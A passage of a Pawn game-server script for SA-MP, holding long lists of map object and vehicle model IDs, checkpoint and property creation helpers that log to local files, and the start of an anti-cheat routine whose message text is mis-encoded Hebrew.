		1350, 1351, 1352, 1363, 1366, 1367, 1478, 1568, 1570, 1571, 2600, 3398, 3407, 3408, 3447, 3459, 3460, 3463, 3516, 3853, 3854,
		3855, 3860, 3861, 3862, 3863, 3875, 6289, 6299, 6462, //street and road items ( poles etc. )
		625, 626, 627, 628, 630, 631, 632, 633, 635, 636, 637, 638, 639, 640, 644, 646, 647, 650, 651, 653, 675, 677, 678, 679, 682,
		692, 701, 702, 728, 741, 742, 743, 753, 754, 755, 756, 757, 759, 760, 761, 762, 800, 801, 802, 803, 804, 805, 806, 808, 809,
		810, 811, 812, 813, 814, 815, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 855, 856, 857, 859, 860, 861, 862, 863,
		864, 865, 866, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 948, 949, 950, 1360, 1361, 1364, 1597, 1807, 2001, 2010, 2011,
		2194, 2195, 2203, 2240, 2241, 2242, 2243, 2244, 2245, 2246, 2247, 2248, 2250, 2251, 2252, 2253, 2254, 2345, 2811, 3409,
		3439, 3450, 3520, 3532, 3660, 3802, 3806, 3810, 3811, 4034, 4172, 4173, 4174, 4175, 4184, 4185, 4981, 4982, 4984, 4985, 4986,
		4992, 4993, 5023, 5024, 5025, 5078, 5150, 5234, 5265, 5266, 5290, 5322, 5324, 5325, 5327, 5328, 5339, 5407, 5412, 5417, 5565,
		5629, 5633, 5634, 5635, 5636, 5637, 5638, 5641, 5682, 5847, 5877, 5888, 6046, 6204, 6214, 6237, 6362, 6372, 6386, 6399, 6403,
		6421, 6430, 6431, 6444, 6499, 7095, 7595, 7662, 7884, 7952, 7953, 7954, 7986, 8319, 8321, 8617, 8619, 8623, 8660, 8679, 8825,
		8826, 8827, 8828, 8835, 8836, 8837, 8846, 8852, 8887, 8888, 8889, 8982, 8989, 8990, 8991, 9019, 9034, 9035, 9152, 9153, 9317,
		9318, 9331, 9333, 9334, 9335, 9336, 9344, 9347, 9348, 9350, 9812, 10445, 11413, 11414, 13174, 13699, 13748, 13802, 14400, 14402,
		14468, 14469, 14804, 14834, 15038, 16390, 17528, 17532, 17872, 17874, 17875, 17876, 17879, 17886, 17887, 17891, 17905, 17907, 17937,
		17938, 17939, 17941, 17942, 17947, 17958, 18011, 18012, 18013, 18014, 18015, //plants
		744, 745, 746, 747, 748, 749, 750, 751, 752, 758, 807, 816, 828, 867, 868, 879, 880, 896, 897, 898, 899, 900, 901, 905, 906,
		1207, 1303, 1304, 4816, 9044, 9045, 9743, 9744, 9745, 9746, 10166, 10984, 10985, 10986, 11498, 11556, 13023, 13635, 16104,
		16110, 16111, 16112, 16113, 16114, 16115, 16116, 16117, 16118, 16119, 16120, 16121, 16122, 16123, 16124, 16125, 16126, 16127, 16128,
		16129, 16130, 16131, 16133, 16139, 16140, 16141, 16142, 16145, 16411, 16503, 16667, 16675, 16692, 17025, 17026, 17027, 17028, 17029,
		17030, 17031, 17032, 17033, 17034, 17035, 17069, 17071, 17076, 17299, 17456, 18225, 18226, 18227, 18228, //rock
		615, 616, 617, 618, 619, 621, 622, 623, 624, 629, 634, 641, 645, 648, 649, 652, 654, 655, 656, 657, 658, 659, 660, 661, 664,
		669, 670, 671, 672, 673, 674, 676, 680, 681, 683, 685, 686, 687, 688, 689, 690, 691, 693, 694, 695, 696, 697, 698, 700, 703, 704,
		705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 729, 730, 731,
		732, 733, 734, 735, 736, 737, 738, 739, 740, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779,
		780, 781, 782, 789, 790, 791, 792, 858, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 904, 3505, 3506,
		3507, 3508, 3509, 3510, 3511, 3512, 3517, 16060, 16061, 18268, 18269, 18270, 18271, 18272, 18273, //trees
		1681, 1682, 1683, 2469, 2470, 2472, 2473, 2510, 2511, 2512, 2773, 2774, 2775, 2781, 2792, 2793, 2794, 2795, 2796, 2797, 3489, 3491,
		3526, 3629, 3658, 3659, 3666, 3814, 3816, 3881, 3882, 4726, 4727, 4828, 4829, 4830, 4831, 4832, 4833, 4838, 4854, 4855, 4856, 4862,
		4863, 4864, 4865, 4866, 4867, 4869, 4874, 4890, 4990, 4991, 4995, 4996, 4997, 4998, 4999, 5000, 5002, 5003, 5004, 5006, 5009, 5034,
		6973, 7153, 7978, 7981, 8038, 8171, 8172, 8240, 8247, 8249, 8251, 8253, 8281, 8343, 8344, 8350, 8354, 8355, 8356, 8357, 8550, 9241,
		10029, 10755, 10756, 10757, 10758, 10760, 10761, 10763, 10766, 10767, 10768, 10769, 10810, 10815, 10816, 10817, 10818, 10819, 11283,
		11285, 14404, 14548, 14550, 14553, 16098, 16100, 16407, 16408, 16409, 16771, //airport objects
		3448, 3493, 4032, 4232, 4597, 4598, 4638, 4639, 4640, 4641, 4642, 4697, 6387, 6971, 6997, 7010, 7184, 7244, 7245, 7419, 7488, 7984,
		8040, 8390, 8407, 8410, 8420, 8841, 9957, 10010, 10051, 10621, 10629, 10778, 10779, 10780, 10781, 10782, 10783, 10784, 10785, 10786,
		10787, 10788, 17556, 17557, 17558, //car parks
		1451, 1452, 1453, 1454, 1457, 1458, 1479, 1480, 1482, 1483, 3252, 3286, 3375, 3402, 3403, 3419, 12915, 12917, 12918, 12919, 12920,
		12921, 12922, 13002, 13206, 13367, 14871, 14873, 14875, 16108, 16388, 16389, 16404, 16405, 16406, 17000, 17009, 17010, 17011, 17039,
		17052, 17053, 17054, 17057, 17058, 17059, 17060, 17061, 17063, 17074, 17298, 17324, 17457, //farm objects
		966, 968, 969, 970, 971, 972, 973, 974, 975, 976, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993,
		994, 995, 996, 997, 998, 1250, 1251, 1282, 1374, 1407, 1408, 1410, 1411, 1412, 1413, 1414, 1418, 1419, 1422, 1423, 1424,
		1425, 1427, 1434, 1435, 1446, 1447, 1456, 1459, 1460, 1552, 1553, 1648, 1652, 1653, 1662, 2098, 2395, 2400, 2650, 2651, 2755,
		3260, 3275, 3276, 3282, 3451, 3475, 3550, 3749, 3771, 3850, 4099, 4100, 4190, 4195, 4196, 4201, 4202, 4724, 5001, 5005, 5007, 5030,
		5062, 5070, 5071, 5072, 5073, 5074, 5075, 5076, 5077, 5051, 5068, 5081, 5082, 5190, 5306, 5338, 5893, 6049, 6960, 6961, 6967, 6968,
		6969, 6970, 7022, 7026, 7028, 7029, 7030, 7031, 7033, 7034, 7038, 7039, 7191, 7192, 7196, 7197, 7198, 7209, 7210, 7212, 7223, 7224,
		7227, 7277, 7292, 7319, 7361, 7367, 7368, 7369, 7370, 7371, 7377, 7378, 7379, 7380, 7381, 7418, 7423, 7504, 7505, 7514, 7517, 7518,
		7522, 7524, 7538, 7539, 7540, 7556, 7560, 7592, 7593, 7611, 7612, 7613, 7614, 7615, 7623, 7624, 7625, 7657, 7663, 7664, 7665, 7692,
		7837, 7838, 7839, 7840, 7841, 7842, 7893, 7894, 7919, 7920, 7921, 7922, 7923, 7924, 7933, 7939, 7956, 8041, 8042, 8147, 8148, 8149,
		8150, 8151, 8152, 8153, 8154, 8155, 8165, 8167, 8173, 8174, 8175, 8176, 8177, 8178, 8185, 8186, 8187, 8188, 8189, 8194, 8206, 8207,
		8208, 8209, 8210, 8229, 8262, 8263, 8311, 8313, 8314, 8315, 8320, 8342, 8369, 8416, 8481, 8549, 8556, 8559, 8645, 8646, 8647, 8648,
		8649, 8650, 8651, 8652, 8653, 8656, 8657, 8658, 8659, 8662, 8673, 8674, 8680, 8681, 8682, 8683, 8684, 8685, 8686, 8869, 8871, 9029,
		9030, 9031, 9032, 9033, 9041, 9292, 9293, 9294, 9295, 9296, 9297, 9298, 9330, 9332, 9337, 9339, 9340, 9343, 9349, 9482, 9608, 9893,
		10252, 10396, 10402, 10437, 10442, 10611, 10682, 10683, 10806, 10807, 10808, 10809, 10835, 10836, 10874, 10875, 10885, 10889, 10890,
		11014, 11091, 11238, 11239, 11240, 11241, 11242, 11243, 11247, 11438, 11452, 11473, 11474, 11499, 11551, 11567, 11568, 11571, 11607,
		11623, 12848, 12858, 12933, 13016, 13018, 13024, 13045, 13096, 13097, 13098, 13118, 13153, 13336, 13438, 13445, 13663, 13665, 13705,
		14464, 14459, 14843, 14856, 14883, 16016, 16017, 16018, 16019, 16020, 16022, 16052, 16094, 16136, 16281, 16293, 16294, 16295, 16296,
		16297, 16298, 16299, 16300, 16312, 16313, 16315, 16320, 16321, 16324, 16369, 16370, 16627, 16628, 16629, 16630, 16631, 16632, 16633,
		16634, 16635, 16636, 16638, 16664, 16668, 16669, 16670, 16671, 16683, 17510, 18074, 18202, 18216, 18218, 18219, 18220, 18221, 18222,
		18223, 18224, 18255, 18276, 18277, 18278, 18279, 18280, 18281, 18286, 18287, 18288, 18289, 18290, 18291, 18292, 18432, 18433, 18434,
		18440, 18441, 18442, 18443, 18444, 18445, 18446, //Fences, Walls, Gates, and Barriers
		3187, 3359, 3458, 3627, 4199, 4892, 5401, 5409, 5774, 5853, 6909, 6910, 7520, 7971, 8947, 8954, 9169, 9171, 9321, 9899, 10282, 10789,
		11292, 11326, 11387, 11388, 11389, 11390, 11391, 11392, 11393, 11480, 11494, 11504, 11505, 11547, 12853, 13296, 14776, 14783, 14796,
		14797, 14798, 14826, 14876, 16107, 16360, 16362, 16477, 17036, 17037, 17064, 17065, 17852,
		17950, 18232, 18283, 18284, 18452, 18474, //Structure Garages and Petrol Stations
		1245, 1503, 1631, 1632, 1633, 1634, 1655, 1660, 1696, 1697, 1894, 2931, 3269, 3270, 3363, 3364, 3625, 3663, 3664, 3665, 3852, 5152,
		5153, 6052, 7979, 7980, 16401, 8302, 8375, 12914, 12956, 13590, 13593, 13604, 13636, 13638, 13640, 13643, 13645,
		13648, 16077, 16084, 16085, 16134, 16302, 16303, 16304, 16305, 16317, 16367, 17565, 18262, 18367, 18451, 18565, 18566, 18567, 18568,
		18569, 18609, //ramps
		4817, 4818, 4819, 4853, 4884, 4885, 5064, 5117, 5118, 5119, 5127, 5272, 5275, 5277, 5347, 5396, 5398, 5399, 5477, 5478, 5479, 5480,
		5513, 5674, 5679, 5772, 5773, 6248, 6249, 6250, 6251, 6252, 6290, 6292, 6501, 6502, 6912, 6913, 6914, 6915, 6916, 6917, 6980, 6981,
		6982, 6983, 6984, 7498, 7499, 7500, 7501, 7502, 7503, 8538, 8539, 8540, 8541, 8542, 8586, 8587, 8588, 8624, 8625, 8626, 8627, 8628,
		8629, 8630, 8631, 8632, 8633, 8634, 8635, 8858, 8860, 9164, 9165, 9166, 9167, 9168, 9705, 10752, 10927, 10931, 10933, 10934, 10935,
		11101, 11228, 11229, 11230, 11231, 11232, 11464, 11465, 11466, 11467, 11468, 12831, 12832, 12833, 12835, 12836, 12837, 12838, 13312,
		13491, 16024, 16025, 16026, 16027, 16028, 16029, 16030, 16031, 16032, 16033, 16034, 16035, 16036, 16156, 17283, 17284, 17285, 17286,
		17287, 17288, 17289, 17290, 17291, 17292, 17296, 17297, //Railroads
		3330, 3331, 3381, 3411, 3412, 3990, 3991, 3992, 3993, 3994, 3995, 3996, 4085, 4086, 4087, 4088, 4089, 4090, 4091, 4107, 4108, 4125,
		4127, 4128, 4129, 4131, 4133, 4139, 4142, 4144, 4146, 4148, 4150, 4152, 4154, 4156, 4158, 4160, 4163, 4165, 4168, 4182, 4203, 4207,
		4209, 4233, 4553, 4557, 4567, 4589, 4644, 4645, 4646, 4647, 4648, 4649, 4650, 4651, 4652, 4653, 4654, 4656, 4658, 4660, 4662, 4664,
		4666, 4679, 4692, 4694, 4695, 4710, 4807, 4808, 4809, 4820, 4821, 4822, 4823, 4827, 4834, 4835, 4836, 4837, 4839, 4840, 4841, 4846,
		4868, 4870, 4871, 4872, 4878, 4895, 5013, 5021, 5026, 5028, 5038, 5046, 5052, 5106, 5112, 5113, 5120, 5121, 5124, 5125, 5128, 5133,
		5141, 5147, 5149, 5178, 5188, 5191, 5250, 5271, 5276, 5296, 5297, 5298, 5314, 5329, 5330, 5333, 5349, 5353, 5391, 5394, 5395, 5411,
		5431, 5432, 5433, 5434, 5435, 5436, 5437, 5438, 5439, 5440, 5441, 5442, 5456, 5469, 5470, 5472, 5473, 5481, 5482, 5483, 5484, 5485,
		5486, 5487, 5488, 5489, 5490, 5491, 5492, 5493, 5494, 5495, 5496, 5497, 5498, 5499, 5500, 5501, 5502, 5503, 5504, 5505, 5506, 5507,
		5508, 5509, 5510, 5511, 5512, 5528, 5650, 5668, 5703, 5707, 5744, 5745, 5746, 5747, 5748, 5749, 5750, 5751, 5752, 5753, 5754, 5755,
		5756, 5757, 5758, 5759, 5793, 5794, 5795, 5796, 5797, 5798, 5799, 5800, 5801, 5802, 5803, 5804, 5805, 5806, 5807, 5808, 5809, 5859,
		5860, 5861, 5862, 5866, 5994, 5995, 6035, 6054, 6055, 6111, 6112, 6113, 6114, 6115, 6116, 6117, 6118, 6119, 6120, 6121, 6122, 6123,
		6124, 6125, 6126, 6127, 6128, 6129, 6225, 6231, 6235, 6291, 6301, 6302, 6303, 6304, 6305, 6306, 6307, 6308, 6309, 6310, 6311, 6314,
		6316, 6317, 6318, 6319, 6320, 6321, 6322, 6323, 6324, 6325, 6326, 6327, 6329, 6330, 6331, 6333, 6341, 6345, 6427, 6428, 6448, 6449,
		6450, 6507, 6508, 6509, 6876, 6877, 6878, 6879, 6880, 6881, 6886, 6887, 6888, 6897, 6898, 6899, 6900, 6945, 6948, 6949, 6950, 6951,
		6952, 6953, 6956, 6974, 6990, 6991, 6999, 7036, 7041, 7042, 7043, 7052, 7053, 7054, 7055, 7056, 7057, 7064, 7069, 7320, 7321, 7324,
		7326, 7327, 7334, 7335, 7336, 7337, 7355, 7362, 7364, 7383, 7427, 7428, 7429, 7430, 7431, 7432, 7433, 7434, 7435, 7436, 7437, 7438,
		7439, 7440, 7441, 7442, 7443, 7444, 7445, 7446, 7447, 7476, 7477, 7478, 7479, 7480, 7481, 7482, 7483, 7484, 7485, 7486, 7544, 7545,
		7546, 7547, 7548, 7549, 7550, 7551, 7552, 7558, 7559, 7580, 7581, 7587, 7589, 7590, 7605, 7629, 7631, 7632, 7633, 7634, 7729, 7730,
		7731, 7755, 7849, 7852, 7854, 7863, 7864, 7865, 7866, 7867, 7868, 7878, 7881, 7938, 7945, 7963, 7965, 7967, 7969, 7987, 7988, 7989,
		7990, 7991, 7992, 7993, 7995, 8009, 8010, 8036, 8039, 8045, 8046, 8047, 8048, 8049, 8050, 8051, 8052, 8053, 8054, 8055, 8056, 8070,
		8080, 8128, 8135, 8137, 8212, 8213, 8214, 8215, 8216, 8217, 8218, 8219, 8236, 8244, 8245, 8246, 8256, 8290, 8305, 8368, 8377, 8380,
		8382, 8383, 8386, 8388, 8438, 8439, 8440, 8441, 8442, 8443, 8444, 8445, 8446, 8447, 8448, 8449, 8450, 8451, 8452, 8453, 8454, 8455,
		8456, 8457, 8458, 8471, 8472, 8473, 8474, 8475, 8476, 8477, 8510, 8511, 8512, 8514, 8517, 8518, 8519, 8520, 8521, 8522, 8523, 8524,
		8525, 8543, 8552, 8561, 8562, 8609, 8610, 8611, 8612, 8616, 8622, 8637, 8638, 8824, 8832, 8838, 8932, 9000, 9001, 9002, 9003, 9004,
		9005, 9006, 9007, 9008, 9021, 9022, 9023, 9024, 9025, 9026, 9027, 9028, 9036, 9042, 9115, 9116, 9117, 9118, 9119, 9120, 9150, 9205,
		9222, 9231, 9232, 9233, 9250, 9251, 9252, 9262, 9264, 9265, 9266, 9267, 9269, 9476, 9485, 9486, 9487, 9488, 9489, 9490, 9491, 9492,
		9493, 9570, 9571, 9575, 9591, 9600, 9601, 9602, 9603, 9652, 9653, 9683, 9685, 9689, 9690, 9693, 9694, 9696, 9699, 9700, 9701, 9702,
		9703, 9704, 9706, 9707, 9708, 9709, 9710, 9711, 9712, 9713, 9714, 9715, 9716, 9717, 9718, 9719, 9720, 9721, 9722, 9723, 9724, 9725,
		9726, 9727, 9728, 9729, 9730, 9731, 9732, 9733, 9734, 9735, 9736, 9747, 9827, 9832, 9837, 9838, 10018, 10065, 10066, 10067, 10068, 10069,
		10070, 10071, 10072, 10073, 10074, 10075, 10076, 10077, 10078, 10110, 10111, 10112, 10113, 10114, 10115, 10116, 10117, 10118, 10119, 10120,
		10121, 10122, 10123, 10124, 10125, 10126, 10127, 10128, 10129, 10130, 10131, 10132, 10133, 10134, 10135, 10136, 10137, 10138, 10139, 10165,
		10235, 10247, 10275, 10276, 10294, 10295, 10296, 10359, 10360, 10361, 10362, 10363, 10364, 10365, 10367, 10424, 10426, 10440, 10448, 10449,
		10450, 10452, 10455, 10456, 10457, 10458, 10459, 10460, 10461, 10462, 10463, 10464, 10465, 10466, 10467, 10468, 10469, 10470, 10471, 10472,
		10473, 10474, 10475, 10476, 10477, 10478, 10479, 10480, 10481, 10482, 10483, 10484, 10485, 10486, 10487, 10488, 10489, 10490, 10493, 10614,
		10617, 10636, 10639, 10649, 10750, 10751, 10753, 10754, 10759, 10770, 10777, 10790, 10791, 10792, 10820, 10821, 10822, 10823, 10848, 10849,
		10852, 10854, 10855, 10857, 10858, 10859, 10860, 10866, 10867, 10868, 10869, 10870, 10928, 10929, 10930, 10937, 10940, 10958, 10967, 10968,
		10970, 10971, 11003, 11071, 11072, 11073, 11074, 11075, 11076, 11077, 11078, 11079, 11080, 11084, 11094, 11095, 11096, 11098, 11100, 11104,
		11105, 11110, 11111, 11112, 11113, 11114, 11115, 11116, 11117, 11118, 11119, 11120, 11121, 11122, 11123, 11124, 11125, 11126, 11127, 11128,
		11129, 11130, 11131, 11132, 11133, 11134, 11135, 11136, 11137, 11138, 11252, 11253, 11254, 11255, 11256, 11257, 11258, 11259, 11260, 11261,
		11299, 11302, 11308, 11345, 11351, 11365, 11386, 11409, 11421, 11462, 12800, 12801, 12802, 12803, 12806, 12809, 12810, 12811, 12812, 12813,
		12815, 12816, 12817, 12818, 12819, 12820, 12826, 12827, 12828, 12829, 12830, 12851, 12852, 12856, 12857, 12867, 12873, 12874, 12875, 12876,
		12877, 12878, 12879, 12880, 12881, 12882, 12883, 12884, 12885, 12886, 12887, 12888, 12889, 12890, 12891, 12892, 12893, 12894, 12895, 12896,
		12897, 12898, 12899, 12900, 12901, 12902, 12903, 12904, 12905, 12906, 12907, 12909, 12910, 12965, 12966, 12967, 12968, 12970, 12971, 12972,
		12973, 12974, 12975, 12992, 12993, 12994, 12995, 12996, 12997, 12998, 12999, 13000, 13001, 13020, 13033, 13034, 13038, 13058, 13088, 13092,
		13095, 13119, 13127, 13128, 13129, 13138, 13139, 13141, 13142, 13168, 13169, 13170, 13173, 13321, 13323, 13324, 13325, 13332, 13342, 13345,
		13347, 13348, 13349, 13368, 13422, 13470, 13626, 13652, 13655, 13664, 13672, 13673, 13674, 13676, 13677, 13678, 13680, 13682, 13683, 13684,
		13685, 13688, 13689, 13690, 13693, 13703, 13704, 13706, 13707, 13708, 13709, 13713, 13717, 13718, 13720, 13726, 13727, 13730, 13732, 13733,
		13735, 13736, 13738, 13739, 13751, 13752, 13784, 13789, 13814, 13845, 13865, 13882, 13887, 16037, 16266, 16357, 16358, 16384, 16430, 16571,
		16610, 17002, 17003, 17004, 17043, 17062, 17077, 17078, 17110, 17111, 17112, 17120, 17146, 17148, 17150, 17152, 17154, 17156, 17158, 17160,
		17162, 17164, 17166, 17168, 17170, 17172, 17174, 17176, 17178, 17180, 17182, 17184, 17186, 17188, 17190, 17192, 17194, 17196, 17198, 17200,
		17202, 17204, 17208, 17210, 17212, 17214, 17216, 17218, 17220, 17222, 17224, 17226, 17228, 17230, 17232, 17234, 17236, 17238, 17240, 17242,
		17244, 17246, 17248, 17250, 17252, 17254, 17256, 17258, 17260, 17262, 17267, 17269, 17271, 17273, 17275, 17277, 17279, 17281, 17293, 17294,
		17295, 17300, 17303, 17305, 17307, 17308, 17309, 17310, 17326, 17327, 17329, 17331, 17333, 17334, 17501, 17502, 17525, 17550, 17561, 17576,
		17595, 17596, 17597, 17598, 17599, 17600, 17602, 17603, 17604, 17605, 17606, 17607, 17608, 17609, 17610, 17611, 17612, 17613, 17621, 17622,
		17623, 17624, 17625, 17626, 17627, 17628, 17629, 17630, 17631, 17632, 17634, 17635, 17637, 17638, 17639, 17640, 17641, 17642, 17643, 17644,
		17646, 17647, 17648, 17649, 17650, 17651, 17652, 17653, 17654, 17655, 17656, 17657, 17658, 17659, 17660, 17661, 17662, 17663, 17666, 17667,
		17668, 17669, 17670, 17671, 17672, 17673, 17674, 17675, 17676, 17680, 17681, 17682, 17683, 17684, 17686, 17687, 17692, 17693, 17695, 17829,
		17849, 17867, 17920, 17921, 17927, 17936, 17968, 18229, 18256, 18369, 18370, 18371, 18372, 18373, 18374, 18375, 18376, 18377, 18378, 18379,
		18380, 18381, 18382, 18383, 18384, 18385, 18386, 18387, 18388, 18389, 18390, 18391, 18392, 18393, 18394, 18449, 18450, 18561 //roads
		: return 1;
		default: return 0;
	}
	return 0;
}
//=[IsValidVehicleModelID]======================================================
stock IsValidVehicleModelID(vmodelid)
{   // by opium, improved by me
	switch(vmodelid)
	{
		case 581, 523, 462, 521, 463, 522, 461, 448, 468, 586, 509, 481, 510, 472, 473, 493, 595, 484, 430, 453,
		452, 446, 454, 445, 602, 416, 485, 568, 429, 433, 499, 424, 536, 496, 504, 422, 609, 498, 401, 575, 518,
		402, 541, 482, 431, 438, 457, 527, 483, 524, 415, 542, 589, 437, 532, 480, 596, 599, 597, 598, 578, 486,
		507, 562, 585, 427, 419, 587, 490, 528, 533, 544, 407, 565, 455, 530, 526, 466, 604, 492, 474, 588, 434,
		502, 503, 494, 579, 545, 411, 546, 559, 508, 571, 400, 403, 517, 410, 551, 500, 418, 572, 423, 414, 516,
		582, 467, 443, 470, 404, 514, 603, 600, 413, 426, 436, 547, 489, 441, 594, 564, 515, 479, 534, 432, 505,
		442, 440, 475, 543, 605, 495, 567, 428, 405, 535, 458, 580, 439, 561, 409, 560, 506, 601, 574, 566, 549,
		420, 459, 576, 525, 531, 408, 583, 451, 558, 552, 540, 491, 412, 478, 421, 529, 456, 554, 477, 548, 425,
		417, 487, 497, 563, 501, 465, 447, 469, 488, 406, 573, 444, 556, 557, 592, 577, 511, 512, 593, 520, 553,
		464, 476, 519, 460, 513, 539, 471, 435, 450, 591, 606, 607, 610, 584, 608, 611, 590, 449
		: return 1;
		default: return 0;
	}
	return 0;
}
//=[GetRandomPlayer]============================================================
stock GetRandomPlayer()
{
	new mx = MAX_PLAYERS, rnd = mx, tr;
	while(!IsPlayerConnected(rnd) || IsPlayerNPC(rnd))
	{
		tr++;
		if(tr > 99999) return -1;
		rnd = randomEx(0,mx+1);
	}
	return rnd;
}
//=[CreateCheckpoint]===========================================================
stock CreateCheckpoint(Float:x,Float:y,Float:z,interior,world,type,Float:size=default_cpsize,Float:dis=default_cpdistance,Float:a=0.0,par=0,thecpname[]="",wt=0)
{
	cpinfo[cps][cpactive] = 1;
	cpinfo[cps][cpx] = x;
	cpinfo[cps][cpy] = y;
	cpinfo[cps][cpz] = z;
	cpinfo[cps][cpint] = interior;
	cpinfo[cps][cpworld] = world;
	cpinfo[cps][cpsize] = (size < 1.0? default_cpsize:size);
	cpinfo[cps][cpdis] = (dis < 1.0? default_cpdistance:dis);
	cpinfo[cps][cptype] = type;
	cpinfo[cps][cppar] = par;
	if(wt)
	{
		new File:f, string[M_S];
		f = fopen(file_cps,io_append);
		switch(type)
		{
			case cp_bank: format(string,sizeof(string),"CreateBank(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
			case cp_ammu: format(string,sizeof(string),"CreateAmmunation(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
			case cp_wang: format(string,sizeof(string),"CreateWang(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
			case cp_sammu: format(string,sizeof(string),"CreateSAmmunation(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
            case cp_vgarage: format(string,sizeof(string),"CreateVGarage(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
			case cp_bar: format(string,sizeof(string),"CreateBar(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
			case cp_phone: format(string,sizeof(string),"CreatePhone(%.4f,%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,a,interior,world);
			case cp_atm: format(string,sizeof(string),"CreateATM(%.4f,%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,a,interior,world);
			case cp_sgarage: format(string,sizeof(string),"CreateSGarage(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
			case cp_lighthouse: format(string,sizeof(string),"CreateLighthouse(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
			case cp_abank: format(string,sizeof(string),"CreateAdminBank(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
			case cp_gambling: format(string,sizeof(string),"CreateGamblingPoint(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d,%d);\r\n",x,y,z,size,dis,interior,world,par);
			case cp_store: format(string,sizeof(string),"CreateStore(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d,%d,\"%s\");\r\n",x,y,z,size,dis,interior,world,par,thecpname);
			case cp_info: format(string,sizeof(string),"CreateInformer(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
			case cp_vstation: format(string,sizeof(string),"CreateVStation(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
			case cp_dancing: format(string,sizeof(string),"CreateDancingPoint(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
			case cp_jumping: format(string,sizeof(string),"CreateJumpingPoint(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
			case cp_furnitures: format(string,sizeof(string),"CreateFurnitures(%.4f,%.4f,%.4f,%.4f,%.4f,%d,%d);\r\n",x,y,z,size,dis,interior,world);
		}
		fwrite(f,string);
		fclose(f);
	}
	//if(type == cp_cbank && par != 0) claninfo[par][ccp] = cps;
	if(type == cp_phone || type == cp_vstore) CreateSObject(1216,x,y,z,0.0,0.0,a,.interior=interior,.world=world);
	if(type == cp_atm) CreateSObject(2942,x,y,z,0.0,0.0,a,.interior=interior,.world=world);
	if(type == cp_jumping || type == cp_dancing) CreatePickupEx(19132,1,x,y,z,.world=world);
	format(cpinfo[cps][cpname],32,thecpname);
	cpinfo[cps][cpstoreid] = -1;
	cpinfo[cps][cpused] = INVALID_PLAYER_ID;
	cpinfo[cps][cparea] = CreateArea(x-dis,y-dis,x+dis,y+dis,area_cp,cps,interior,world);
	cps++;
	return (cps-1);
}
//=[UpdateCheckpointArea]=======================================================
stock UpdateCheckpointArea(cpid)
{
	DestroyArea(cpinfo[cpid][cparea]);
	cpinfo[cps][cparea] = CreateArea(cpinfo[cpid][cpx]-cpinfo[cpid][cpdis],cpinfo[cpid][cpy]-cpinfo[cpid][cpdis],cpinfo[cpid][cpx]+cpinfo[cpid][cpdis],cpinfo[cpid][cpy]+cpinfo[cpid][cpdis],area_cp,cps,cpinfo[cpid][cpint],cpinfo[cpid][cpworld]);
	return 1;
}
//=[GetPlayerCheckpoint]========================================================
stock GetPlayerCheckpoint(playerid) return playerinfo[playerid][cp] == -1 ? cp_none : cpinfo[playerinfo[playerid][cp]][cptype];
//=[CreateProperty]=============================================================
stock CreateProperty(Float:x,Float:y,Float:z,cost,earning,name[],spid_ = 0,sptext_[] = "",real=0)
{
	if(!real)
	{
		new File:f, string[M_S];
		if(!fexist(file_props)) fcreate(file_props);
		f = fopen(file_props,io_append);
		format(string,sizeof(string),"CreateProperty(%.4f,%.4f,%.4f,%d,%d,\"%s\");\r\n",x,y,z,cost,earning,name);
		fwrite(f,string);
		fclose(f);
	}
	format(propinfo[props][pname],256,name);
	propinfo[props][px] = x;
	propinfo[props][py] = y;
	propinfo[props][pz] = z;
	propinfo[props][pcost] = cost;
	propinfo[props][pearning] = earning;
	propinfo[props][owner] = INVALID_PLAYER_ID;
	propinfo[props][spid] = spid_;
	format(propinfo[props][sptext],M_S,sptext_);
	props++;
	new pid = (props-1), string[M_S];
	format(string,sizeof(string),"/DM/Properties/%d.ini",pid);
	if(!fexist(string))
	{
		fcreate(string);
		fsetstring(string,"Owner","None");
		fsetint(string,"LeftEarns",prop_earns);
	}
	propinfo[pid][ppickup] = CreatePickupEx(1273,1,x,y,z,1,world_normal,pid);
	UpdatePropertyText(pid);
	return pid;
}
//=[Cheat]======================================================================
stock Cheat(playerid,cheatname[],punishtype)
{
	if(IsPlayerNPC(playerid) || playerinfo[playerid][admin] == 20 || IsPlayerConnected(playerid)) return 0;
	if(playerinfo[playerid][dontac] > 0) playerinfo[playerid][dontac]--;
	else
	{
		new string[M_S];
		if(punishtype == 1)
		{
			format(string,sizeof(string),acname ": .%s юЄ°ы· фрЁшщЎ'щш ∙ь ф∙°· тщь·ф рЎьъ Ў'щш юёхт",cheatname);
			SendClientMessage(playerid,red,string);
